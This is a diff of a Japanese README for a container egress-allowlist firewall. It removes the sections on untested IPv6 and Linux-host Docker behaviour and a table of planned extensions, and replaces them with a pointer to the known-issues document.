-検証環境のコンテナには `lo` の `::1` しか IPv6 アドレスがありません。`--ipv6` や `enable_ipv6` で IPv6 を有効にした場合、次が未確認です。
-
-* **AAAA を持つ許可先への接続が足踏みしないか** — IPv6 は全 DROP で、DROP は ICMP を返しません。クライアントが RFC 6724 に従って AAAA を先に試すと、IPv4 にフォールバックするまでタイムアウト待ちになる可能性があります。対策案（IPv6 側にも明示的な `REJECT` を置き、IPv4 と同じ扱いにする）は [`docs/known-issues.md`](./docs/known-issues.md) の項目 12 に記載しています
-* **`curl -6` による遮断の実到達性テスト** — グローバル IPv6 アドレスが無いため自己検証でもスキップされています
-* **IPv6 の allowlist** — 現在は設計上すべて DROP です。必要になった場合の拡張方針は [`docs/spec.md`](./docs/spec.md) §10 を参照してください
-
-### Linux ホスト上の Docker
-
-検証はすべて linuxkit VM（Docker Desktop）上です。Linux ホストでは次が変わります。
-
-* **デフォルトブリッジのリゾルバが実在のネットワーク機器になる** — 家庭用ルータや社内 DNS サーバーを指すため、「実機の 53 番への到達経路が 1 本開く」意味合いが Docker Desktop より大きくなります（[DNS リゾルバ](#dns-リゾルバ) 参照）
-* **`systemd-resolved`（`127.0.0.53`）を使うホスト** — デフォルトブリッジでは Docker がループバックを除外して `8.8.8.8` / `8.8.4.4` にフォールバックします。この挙動下での動作は未確認です。ユーザー定義ネットワークを使えば回避できます
-* `iptables` のバックエンド（`nf_tables` / `legacy`）やディストリビューションによる差異
-
-### その他
-
-* **CI ランナー / クラウド開発環境**（GitHub Codespaces 等）での動作
-* **rootless Docker** — `NET_ADMIN` の扱いが変わります
-
-## 実装の拡張
-
-方針は [`docs/spec.md`](./docs/spec.md) §10、個別の課題は [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。
-
-| 項目 | 内容 |
-|---|---|
-| L7 proxy への移行 | ワイルドカード対応・メソッド別制御・DNS トンネリング対策が同時に解ける本命 |
-| IPv6 allowlist | `hash:net family inet6` の set 追加、AAAA 解決、`emit_filter_v6` への ACCEPT |
-| `NFLOG` への移行 | 時刻・ポートまで必要になった場合。`nfnetlink_log` は netns 対応のためコンテナ内から読める |
-| インストール時のチェックサム検証 | スクリプトは root で動作するが、配置時のハッシュ検証は未実装 |
+詳細と、それぞれ何が問題になり得るかは [`docs/known-issues.md`](./docs/known-issues.md) を参照してください。
